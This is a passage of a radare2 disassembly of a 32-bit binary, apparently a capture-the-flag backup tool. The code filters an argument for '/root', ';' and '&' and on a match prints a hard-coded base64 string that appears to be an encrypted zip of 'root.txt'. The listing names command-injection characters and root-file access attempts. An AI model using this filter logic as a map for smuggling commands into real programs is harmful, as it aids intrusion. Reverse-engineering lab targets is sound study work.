|       |   0x08048eb5      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x08048eba      e8d1f7ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048ebf      83c410         add esp, 0x10
|       |   0x08048ec2      83ec0c         sub esp, 0xc
|       |   0x08048ec5      6a00           push 0
|       |   0x08048ec7      e8f4f7ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048ea0 (sym.main)
|       `-> 0x08048ecc      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08048ecf      83c00c         add eax, 0xc
|           0x08048ed2      8b00           mov eax, dword [eax]
|           0x08048ed4      83ec08         sub esp, 8
|           0x08048ed7      68c59e0408     push str.root               ; 0x8049ec5 ; "/root"
|           0x08048edc      50             push eax
|           0x08048edd      e8fef6ffff     call sym.imp.strstr         ; char*strstr(char *s1, const char *s2)
|           0x08048ee2      83c410         add esp, 0x10
|           0x08048ee5      85c0           test eax, eax
|       ,=< 0x08048ee7      742a           je 0x8048f13
|       |   0x08048ee9      83ec0c         sub esp, 0xc
|       |   0x08048eec      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x08048ef1      e889faffff     call sym.displaySuccess
|       |   0x08048ef6      83c410         add esp, 0x10
|       |   0x08048ef9      83ec0c         sub esp, 0xc
|       |   0x08048efc      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x08048f01      e88af7ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048f06      83c410         add esp, 0x10
|       |   0x08048f09      83ec0c         sub esp, 0xc
|       |   0x08048f0c      6a00           push 0
|       |   0x08048f0e      e8adf7ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048ee7 (sym.main)
|       `-> 0x08048f13      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08048f16      83c00c         add eax, 0xc
|           0x08048f19      8b00           mov eax, dword [eax]
|           0x08048f1b      83ec08         sub esp, 8
|           0x08048f1e      6a3b           push 0x3b                   ; ';' ; 59
|           0x08048f20      50             push eax
|           0x08048f21      e8baf7ffff     call sym.imp.strchr         ; char*strchr(char *s, int c)
|           0x08048f26      83c410         add esp, 0x10
|           0x08048f29      85c0           test eax, eax
|       ,=< 0x08048f2b      742a           je 0x8048f57
|       |   0x08048f2d      83ec0c         sub esp, 0xc
|       |   0x08048f30      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x08048f35      e845faffff     call sym.displaySuccess
|       |   0x08048f3a      83c410         add esp, 0x10
|       |   0x08048f3d      83ec0c         sub esp, 0xc
|       |   0x08048f40      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x08048f45      e846f7ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048f4a      83c410         add esp, 0x10
|       |   0x08048f4d      83ec0c         sub esp, 0xc
|       |   0x08048f50      6a00           push 0
|       |   0x08048f52      e869f7ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048f2b (sym.main)
|       `-> 0x08048f57      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08048f5a      83c00c         add eax, 0xc
|           0x08048f5d      8b00           mov eax, dword [eax]
|           0x08048f5f      83ec08         sub esp, 8
|           0x08048f62      6a26           push 0x26                   ; '&' ; 38
|           0x08048f64      50             push eax
|           0x08048f65      e876f7ffff     call sym.imp.strchr         ; char*strchr(char *s, int c)
|           0x08048f6a      83c410         add esp, 0x10
|           0x08048f6d      85c0           test eax, eax
|       ,=< 0x08048f6f      742a           je 0x8048f9b
|       |   0x08048f71      83ec0c         sub esp, 0xc
|       |   0x08048f74      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x08048f79      e801faffff     call sym.displaySuccess
|       |   0x08048f7e      83c410         add esp, 0x10
|       |   0x08048f81      83ec0c         sub esp, 0xc
|       |   0x08048f84      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; 